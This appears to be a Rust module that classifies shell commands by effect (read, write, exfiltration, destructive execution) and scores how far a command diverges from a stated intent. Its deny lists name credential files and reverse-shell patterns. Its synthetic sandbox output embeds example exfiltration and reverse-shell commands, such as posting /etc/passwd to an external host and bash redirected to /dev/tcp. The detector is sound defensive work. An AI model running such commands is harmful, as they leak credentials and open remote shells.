use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize, Ord, PartialOrd)]
pub enum EffectClass {
    Benign,
    Read,
    Write,
    NetworkRead,
    NetworkWrite,
    Execute,
    PrivilegeChange,
    DestructiveWrite,
    CatastrophicWrite,
    Exfiltration,
    DestructiveExec,
}

impl EffectClass {
    pub fn as_str(&self) -> &'static str {
        match self {
            EffectClass::Benign => "BENIGN",
            EffectClass::Read => "READ",
            EffectClass::Write => "WRITE",
            EffectClass::NetworkRead => "NETWORK_READ",
            EffectClass::NetworkWrite => "NETWORK_WRITE",
            EffectClass::Execute => "EXECUTE",
            EffectClass::PrivilegeChange => "PRIVILEGE_CHANGE",
            EffectClass::DestructiveWrite => "DESTRUCTIVE_WRITE",
            EffectClass::CatastrophicWrite => "CATASTROPHIC_WRITE",
            EffectClass::Exfiltration => "EXFILTRATION",
            EffectClass::DestructiveExec => "DESTRUCTIVE_EXEC",
        }
    }

    pub fn severity(&self) -> u8 {
        match self {
            EffectClass::Benign => 0,
            EffectClass::Read => 1,
            EffectClass::NetworkRead => 2,
            EffectClass::Write => 3,
            EffectClass::Execute => 4,
            EffectClass::PrivilegeChange => 5,
            EffectClass::NetworkWrite => 6,
            EffectClass::DestructiveWrite => 7,
            EffectClass::CatastrophicWrite => 8,
            EffectClass::Exfiltration => 9,
            EffectClass::DestructiveExec => 10,
        }
    }

    pub fn floor(&self) -> f64 {
        match self {
            EffectClass::Benign => 0.0,
            EffectClass::Read => 0.0,
            EffectClass::NetworkRead => 0.20,
            EffectClass::Write => 0.25,
            EffectClass::Execute => 0.40,
            EffectClass::PrivilegeChange => 0.55,
            EffectClass::NetworkWrite => 0.60,
            EffectClass::DestructiveWrite => 0.80,
            EffectClass::CatastrophicWrite => 0.95,
            EffectClass::Exfiltration => 0.90,
            EffectClass::DestructiveExec => 1.0,
        }
    }
}

#[derive(Debug, Clone)]
pub struct ParsedSubCommand {
    pub binary: String,
    pub flags_str: String,
    pub full_str: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EffectGraph {
    pub command: String,
    pub subcommand_effects: Vec<(EffectClass, Vec<String>)>,
    pub worst_effect: EffectClass,
    pub divergence_floor: f64,
    pub intent_effects: HashSet<EffectClass>,
    pub actual_effects: HashSet<EffectClass>,
    pub effect_divergence: f64,
    pub evidence: Vec<String>,
    pub is_pipe_chain: bool,
    pub sensitive_data_in_chain: bool,
}

#[derive(Debug, Clone)]
struct Capability {
    base: EffectClass,
    flag_modifiers: Vec<(&'static str, EffectClass)>,
}

fn capabilities() -> HashMap<&'static str, Capability> {
    use EffectClass::*;
    HashMap::from([
        ("ls", Capability { base: Read, flag_modifiers: vec![] }),
        ("ll", Capability { base: Read, flag_modifiers: vec![] }),
        ("la", Capability { base: Read, flag_modifiers: vec![] }),
        ("cat", Capability { base: Read, flag_modifiers: vec![] }),
        ("head", Capability { base: Read, flag_modifiers: vec![] }),
        ("tail", Capability { base: Read, flag_modifiers: vec![] }),
        ("grep", Capability { base: Read, flag_modifiers: vec![] }),
        ("find", Capability { base: Read, flag_modifiers: vec![("-delete", CatastrophicWrite), ("-exec rm", CatastrophicWrite), ("-exec sh", DestructiveExec), ("-exec bash", DestructiveExec)] }),
        ("stat", Capability { base: Read, flag_modifiers: vec![] }),
        ("file", Capability { base: Read, flag_modifiers: vec![] }),
        ("less", Capability { base: Read, flag_modifiers: vec![] }),
        ("more", Capability { base: Read, flag_modifiers: vec![] }),
        ("diff", Capability { base: Read, flag_modifiers: vec![] }),
        ("wc", Capability { base: Read, flag_modifiers: vec![] }),
        ("sort", Capability { base: Read, flag_modifiers: vec![] }),
        ("ps", Capability { base: Read, flag_modifiers: vec![] }),
        ("who", Capability { base: Read, flag_modifiers: vec![] }),
        ("top", Capability { base: Read, flag_modifiers: vec![] }),
        ("id", Capability { base: Read, flag_modifiers: vec![] }),
        ("whoami", Capability { base: Read, flag_modifiers: vec![] }),
        ("env", Capability { base: Read, flag_modifiers: vec![] }),
        ("echo", Capability { base: Read, flag_modifiers: vec![] }),
        ("pwd", Capability { base: Read, flag_modifiers: vec![] }),
        ("date", Capability { base: Read, flag_modifiers: vec![] }),
        ("uname", Capability { base: Read, flag_modifiers: vec![] }),
        ("mkdir", Capability { base: Write, flag_modifiers: vec![] }),
        ("touch", Capability { base: Write, flag_modifiers: vec![] }),
        ("cp", Capability { base: Write, flag_modifiers: vec![("-r", Write)] }),
        ("mv", Capability { base: Write, flag_modifiers: vec![] }),
        ("tee", Capability { base: Write, flag_modifiers: vec![] }),
        ("sed", Capability { base: Read, flag_modifiers: vec![("-i", Write)] }),
        ("awk", Capability { base: Read, flag_modifiers: vec![] }),
        ("tar", Capability { base: Read, flag_modifiers: vec![("-x", Write), ("--extract", Write), ("--delete", DestructiveWrite)] }),
        ("zip", Capability { base: Write, flag_modifiers: vec![] }),
        ("unzip", Capability { base: Write, flag_modifiers: vec![] }),
        ("rm", Capability { base: CatastrophicWrite, flag_modifiers: vec![] }),
        ("shred", Capability { base: CatastrophicWrite, flag_modifiers: vec![] }),
        ("dd", Capability { base: Write, flag_modifiers: vec![("of=/dev/", CatastrophicWrite)] }),
        ("mkfs", Capability { base: CatastrophicWrite, flag_modifiers: vec![] }),
        ("truncate", Capability { base: CatastrophicWrite, flag_modifiers: vec![] }),
        ("chmod", Capability { base: PrivilegeChange, flag_modifiers: vec![] }),
        ("chown", Capability { base: PrivilegeChange, flag_modifiers: vec![] }),
        ("sudo", Capability { base: Execute, flag_modifiers: vec![("-s", DestructiveExec), ("--shell", DestructiveExec)] }),
        ("su", Capability { base: PrivilegeChange, flag_modifiers: vec![("-", DestructiveExec)] }),
        ("curl", Capability { base: NetworkRead, flag_modifiers: vec![("-d", NetworkWrite), ("--data", NetworkWrite), ("-F", NetworkWrite), ("--form", NetworkWrite), ("-X POST", NetworkWrite), ("-X PUT", NetworkWrite), ("-T", NetworkWrite), ("--upload", NetworkWrite), ("-o", Write)] }),
        ("wget", Capability { base: NetworkRead, flag_modifiers: vec![("--post-data", NetworkWrite), ("--post-file", Exfiltration)] }),
        ("scp", Capability { base: NetworkWrite, flag_modifiers: vec![] }),
        ("rsync", Capability { base: Write, flag_modifiers: vec![("--delete", DestructiveWrite), ("--remove-source-files", DestructiveWrite), ("--delete-after", DestructiveWrite), ("--delete-before", DestructiveWrite), ("--delete-during", DestructiveWrite), ("--delete-excluded", DestructiveWrite)] }),
        ("sftp", Capability { base: NetworkWrite, flag_modifiers: vec![] }),
        ("ftp", Capability { base: NetworkWrite, flag_modifiers: vec![] }),
        ("nc", Capability { base: NetworkRead, flag_modifiers: vec![("-e", DestructiveExec), ("-c", DestructiveExec)] }),
        ("ncat", Capability { base: NetworkRead, flag_modifiers: vec![("-e", DestructiveExec), ("-c", DestructiveExec)] }),
        ("ssh", Capability { base: NetworkRead, flag_modifiers: vec![("-R", NetworkWrite), ("-L", NetworkWrite)] }),
        ("openssl", Capability { base: NetworkRead, flag_modifiers: vec![("s_client", Exfiltration), ("enc -e", Write), ("enc -d", Write), ("genrsa", Write), ("req", Write), ("pkcs12 -export", Exfiltration)] }),
        ("base64", Capability { base: Read, flag_modifiers: vec![("-d", Read)] }),
        ("xxd", Capability { base: Read, flag_modifiers: vec![] }),
        ("hexdump", Capability { base: Read, flag_modifiers: vec![] }),
        ("socat", Capability { base: NetworkWrite, flag_modifiers: vec![("exec", DestructiveExec), ("EXEC", DestructiveExec)] }),
        ("nmap", Capability { base: NetworkRead, flag_modifiers: vec![] }),
        ("strace", Capability { base: Read, flag_modifiers: vec![] }),
        ("ltrace", Capability { base: Read, flag_modifiers: vec![] }),
        ("gdb", Capability { base: Execute, flag_modifiers: vec![] }),
        ("bash", Capability { base: Execute, flag_modifiers: vec![("-i", DestructiveExec), ("-c", Execute)] }),
        ("sh", Capability { base: Execute, flag_modifiers: vec![("-i", DestructiveExec), ("-c", Execute)] }),
        ("python", Capability { base: Execute, flag_modifiers: vec![("-c", Execute)] }),
        ("python3", Capability { base: Execute, flag_modifiers: vec![("-c", Execute)] }),
        ("node", Capability { base: Execute, flag_modifiers: vec![("-e", Execute)] }),
        ("perl", Capability { base: Execute, flag_modifiers: vec![("-e", Execute)] }),
        ("ruby", Capability { base: Execute, flag_modifiers: vec![("-e", Execute)] }),
        ("eval", Capability { base: DestructiveExec, flag_modifiers: vec![] }),
        ("exec", Capability { base: Execute, flag_modifiers: vec![] }),
        ("crontab", Capability { base: Read, flag_modifiers: vec![("-e", Write), ("-r", DestructiveWrite)] }),
        ("at", Capability { base: Write, flag_modifiers: vec![] }),
        ("systemctl", Capability { base: Read, flag_modifiers: vec![("enable", Write), ("disable", Write), ("stop", Write), ("start", Write)] }),
        ("git", Capability { base: Read, flag_modifiers: vec![("clean -fdx", CatastrophicWrite), ("clean -fd", CatastrophicWrite), ("push --force", NetworkWrite), ("push -f", NetworkWrite), ("commit", Write), ("add", Write), ("rm", CatastrophicWrite), ("reset --hard", CatastrophicWrite)] }),
        ("psql", Capability { base: Read, flag_modifiers: vec![("DROP", DestructiveWrite), ("DELETE", DestructiveWrite), ("TRUNCATE", DestructiveWrite), ("INSERT", Write), ("UPDATE", Write), ("CREATE", Write)] }),
        ("mysql", Capability { base: Read, flag_modifiers: vec![("DROP", DestructiveWrite), ("DELETE", DestructiveWrite), ("TRUNCATE", DestructiveWrite)] }),
        ("sqlite3", Capability { base: Read, flag_modifiers: vec![("DROP", DestructiveWrite), ("DELETE", DestructiveWrite)] }),
        ("pip", Capability { base: NetworkRead, flag_modifiers: vec![("install", Write), ("uninstall", DestructiveWrite)] }),
        ("npm", Capability { base: NetworkRead, flag_modifiers: vec![("install", Write), ("uninstall", DestructiveWrite)] }),
        ("apt", Capability { base: NetworkRead, flag_modifiers: vec![("install", Write), ("remove", DestructiveWrite), ("purge", DestructiveWrite)] }),
        ("iptables", Capability { base: PrivilegeChange, flag_modifiers: vec![] }),
        ("ufw", Capability { base: PrivilegeChange, flag_modifiers: vec![("disable", PrivilegeChange), ("delete", PrivilegeChange)] }),
        ("reboot", Capability { base: DestructiveExec, flag_modifiers: vec![] }),
        ("shutdown", Capability { base: DestructiveExec, flag_modifiers: vec![] }),
        ("halt", Capability { base: DestructiveExec, flag_modifiers: vec![] }),
        ("poweroff", Capability { base: DestructiveExec, flag_modifiers: vec![] }),
        ("kill", Capability { base: Write, flag_modifiers: vec![] }),
        ("killall", Capability { base: DestructiveWrite, flag_modifiers: vec![] }),
        ("pkill", Capability { base: Write, flag_modifiers: vec![] }),
    ])
}

fn sensitive_targets() -> Vec<(&'static str, EffectClass)> {
    use EffectClass::*;
    vec![
        ("/etc/passwd", Read), ("/etc/shadow", Read), ("/etc/sudoers", Read), ("/etc/hosts", Read),
        (".env", Read), ("id_rsa", Read), (".aws/credentials", Read), (".ssh/", Read),
        ("authorized_keys", Write), ("/dev/sda", DestructiveWrite), ("/dev/zero", DestructiveWrite), ("/dev/null", Write),
    ]
}

fn payload_patterns() -> Vec<(&'static str, EffectClass, &'static str)> {
    use EffectClass::*;
    vec![
        (r"socket\.connect\s*\(", Exfiltration, "Network socket connection in code payload"),
        (r"os\.system\s*\(", DestructiveExec, "os.system() shell execution in payload"),
        (r"subprocess\.(call|Popen|run)", DestructiveExec, "subprocess execution in payload"),
        (r"__import__\s*\(", DestructiveExec, "Dynamic import in payload"),
        (r"/bin/(sh|bash)", DestructiveExec, "Shell spawned from payload"),
        (r"dup2\s*\(", Exfiltration, "File descriptor duplication — reverse shell pattern"),
        (r"0>&1|>&\s*/dev/tcp", Exfiltration, "Bash I/O redirection to TCP — reverse shell"),
    ]
}

fn infer_intent_effects(prime_intent: &str) -> HashSet<EffectClass> {
    let tokens: HashSet<String> = Regex::new(r"\b\w+\b").unwrap()
        .find_iter(&prime_intent.to_lowercase())
        .map(|m| m.as_str().to_string())
        .collect();

    let read_kw = hs(&["read","check","inspect","view","show","list","display","fetch","get","describe","audit","review","monitor","watch","tail","head","look","examine","verify","query","search","find","locate","status","report","diagnose","trace"]);
    let write_kw = hs(&["create","write","save","store","configure","set","update","modify","edit","change","append","add","insert","prepare","build","compile","generate","produce","make","backup"]);
    let del_kw = hs(&["delete","remove","clean","purge","wipe","clear","drop","erase","archive","retire","decommission","uninstall","destroy","prune","trim","flush","rollback"]);
    let net_kw = hs(&["send","upload","post","transfer","sync","push","export","publish","deploy","broadcast","transmit","forward","relay","notify","report","ping","connect","download","pull","fetch"]);
    let exec_kw = hs(&["run","execute","launch","start","trigger","invoke","call","script","test","migrate","install","apply","process"]);

    let mut implied = HashSet::new();
    if !tokens.is_disjoint(&read_kw) { implied.insert(EffectClass::Read); }
    if !tokens.is_disjoint(&write_kw) { implied.insert(EffectClass::Write); }
    if !tokens.is_disjoint(&del_kw) { implied.insert(EffectClass::DestructiveWrite); implied.insert(EffectClass::CatastrophicWrite); }
    if !tokens.is_disjoint(&net_kw) { implied.insert(EffectClass::NetworkWrite); implied.insert(EffectClass::NetworkRead); }
    if !tokens.is_disjoint(&exec_kw) { implied.insert(EffectClass::Execute); }
    if implied.is_empty() { implied.insert(EffectClass::Read); }
    implied
}

fn hs(values: &[&str]) -> HashSet<String> {
    values.iter().map(|v| v.to_string()).collect()
}

pub fn parse_command(command: &str) -> Vec<ParsedSubCommand> {
    let split_re = Regex::new(r"\|{1,2}|&&|;|\n").unwrap();
    let destructive_mid = Regex::new(r"\s+(rm|shred|mkfs|dd\s+if=)\s").unwrap();
    let mut expanded = Vec::new();
    for part in split_re.split(command) {
        if let Some(m) = destructive_mid.find(part) {
            if m.start() > 0 {
                expanded.push(part[..m.start()].trim().to_string());
                expanded.push(part[m.start()..].trim().to_string());
                continue;
            }
        }
        expanded.push(part.trim().to_string());
    }

    let mut out = Vec::new();
    for part in expanded.into_iter().filter(|p| !p.is_empty()) {
        let tokens = shell_words::split(&part).unwrap_or_else(|_| part.split_whitespace().map(|s| s.to_string()).collect());
        if tokens.is_empty() { continue; }
        let binary = tokens[0].trim_start_matches("./").to_lowercase();
        let flags_str = if tokens.len() > 1 { tokens[1..].join(" ") } else { String::new() };
        out.push(ParsedSubCommand { binary, flags_str, full_str: part });
    }
    out
}

pub fn compute_subcommand_effect(sub: &ParsedSubCommand) -> (EffectClass, Vec<String>) {
    let mut evidence = Vec::new();
    let cap_map = capabilities();
    let mut effect = if let Some(cap) = cap_map.get(sub.binary.as_str()) {
        let mut current = cap.base;
        let mut upgraded = false;
        for (flag, eff) in &cap.flag_modifiers {
            if sub.flags_str.to_lowercase().contains(&flag.to_lowercase())
                || sub.full_str.to_lowercase().contains(&flag.to_lowercase())
            {
                if eff.severity() > current.severity() {
                    evidence.push(format!("Flag modifier '{}' upgrades '{}' to {}", flag, sub.binary, eff.as_str()));
                    current = *eff;
                    upgraded = true;
                }
            }
        }
        if !upgraded {
            evidence.push(format!("Binary '{}' base class: {}", sub.binary, current.as_str()));
        }
        current
    } else {
        evidence.push(format!("Unknown binary '{}' — defaulting to EXECUTE class (zero-trust policy)", sub.binary));
        EffectClass::Execute
    };

    for (target, target_class) in sensitive_targets() {
        if sub.full_str.to_lowercase().contains(&target.to_lowercase()) {
            evidence.push(format!("Sensitive target accessed: '{}'", target));
            if target_class.severity() > effect.severity() {
                effect = target_class;
            }
        }
    }

    for (pattern, payload_class, label) in payload_patterns() {
        let re = Regex::new(&format!("(?i){pattern}")).unwrap();
        if re.is_match(&sub.full_str) {
            evidence.push(format!("Payload pattern detected: {label}"));
            if payload_class.severity() > effect.severity() {
                effect = payload_class;
            }
        }
    }

    (effect, evidence)
}

pub fn compute_effect_graph(command: &str, prime_intent: &str) -> EffectGraph {
    let subs = parse_command(command);
    let is_pipe = command.contains('|') || command.contains("&&") || command.contains(';');
    let mut all_evidence = Vec::new();
    let mut subcommand_effects = Vec::new();
    let mut actual_effect_classes = HashSet::new();

    for sub in &subs {
        let (eff, ev) = compute_subcommand_effect(sub);
        subcommand_effects.push((eff, ev.clone()));
        all_evidence.extend(ev);
        actual_effect_classes.insert(eff);
    }

    for (pattern, payload_class, label) in payload_patterns() {
        let re = Regex::new(&format!("(?i){pattern}")).unwrap();
        if re.is_match(command) && !actual_effect_classes.contains(&payload_class) {
            actual_effect_classes.insert(payload_class);
            all_evidence.push(format!("Global payload scan: {label}"));
        }
    }

    let mut worst = actual_effect_classes
        .iter()
        .max_by_key(|e| e.severity())
        .copied()
        .unwrap_or(EffectClass::Benign);

    let effect_list: Vec<EffectClass> = subcommand_effects.iter().map(|(e, _)| *e).collect();
    let sensitive_in_chain = is_pipe
        && ((effect_list.iter().any(|e| *e == EffectClass::Read)
            && effect_list.iter().any(|e| {
                matches!(e, EffectClass::NetworkWrite | EffectClass::NetworkRead | EffectClass::Exfiltration)
            }))
            || effect_list.iter().any(|e| *e == EffectClass::Exfiltration));

    if sensitive_in_chain {
        let old = worst;
        worst = EffectClass::Exfiltration;
        all_evidence.push(format!(
            "Pipe chain detected: READ + NETWORK in same command chain → upgraded {} to EXFILTRATION",
            old.as_str()
        ));
    }

    let base_floor = worst.floor();
    let intent_effects = infer_intent_effects(prime_intent);
    let intent_max = intent_effects.iter().map(|e| e.severity()).max().unwrap_or(0) as f64;
    let actual_max = worst.severity() as f64;
    let severity_gap = actual_max - intent_max;
    let effect_divergence = ((severity_gap / 9.0).clamp(0.0, 1.0) * 1000.0).round() / 1000.0;

    if effect_divergence > 0.1 {
        let mut names: Vec<&str> = intent_effects.iter().map(|e| e.as_str()).collect();
        names.sort_unstable();
        all_evidence.push(format!(
            "Intent-Effect Divergence detected: Intent implies [{}] but command computes to [{}] — divergence score: {:.2}",
            names.join(", "),
            worst.as_str(),
            effect_divergence
        ));
    }

    let divergence_floor = base_floor.max(effect_divergence * 0.8).clamp(0.0, 1.0);

    EffectGraph {
        command: command.to_string(),
        subcommand_effects,
        worst_effect: worst,
        divergence_floor: (divergence_floor * 1000.0).round() / 1000.0,
        intent_effects,
        actual_effects: actual_effect_classes,
        effect_divergence,
        evidence: all_evidence,
        is_pipe_chain: is_pipe,
        sensitive_data_in_chain: sensitive_in_chain,
    }
}

pub fn effect_to_threat_class(effect: EffectClass) -> &'static str {
    match effect {
        EffectClass::Benign | EffectClass::Read => "BENIGN",
        EffectClass::NetworkRead | EffectClass::Write | EffectClass::Execute => "MODERATE",
        EffectClass::PrivilegeChange | EffectClass::NetworkWrite => "ELEVATED",
        EffectClass::DestructiveWrite | EffectClass::Exfiltration | EffectClass::DestructiveExec | EffectClass::CatastrophicWrite => "CRITICAL",
    }
}

pub fn effect_to_sandbox_delta(graph: &EffectGraph) -> serde_json::Value {
    let mut files_changed = Vec::<String>::new();
    let mut files_deleted = Vec::<String>::new();
    let commands_run = vec![graph.command.clone()];
    let mut stdout = String::new();

    for (sub_eff, _) in &graph.subcommand_effects {
        match sub_eff {
            EffectClass::DestructiveWrite => files_deleted.push("(computed: destructive write effect)".into()),
            EffectClass::Write => files_changed.push("(computed: write effect)".into()),
            EffectClass::Exfiltration => stdout.push_str(" curl --data @/etc/passwd https://external "),
            EffectClass::DestructiveExec => stdout.push_str(" bash -i >&/dev/tcp/x/4444 "),
            EffectClass::PrivilegeChange => stdout.push_str(" chmod 777 /sensitive "),
            _ => {}
        }
    }

    if matches!(graph.worst_effect, EffectClass::DestructiveWrite | EffectClass::DestructiveExec) {
        files_deleted.push("deleted: 1 files".into());
    }

    if graph.sensitive_data_in_chain {
        stdout.push_str(" cat /etc/passwd | curl http://external ");
    }

    serde_json::json!({
        "commands_run": commands_run,
        "files_changed": files_changed,
        "files_deleted": files_deleted,
        "stdout": stdout,
        "stderr": "",
        "synthetic": true,
        "effect_graph": true
    })
}
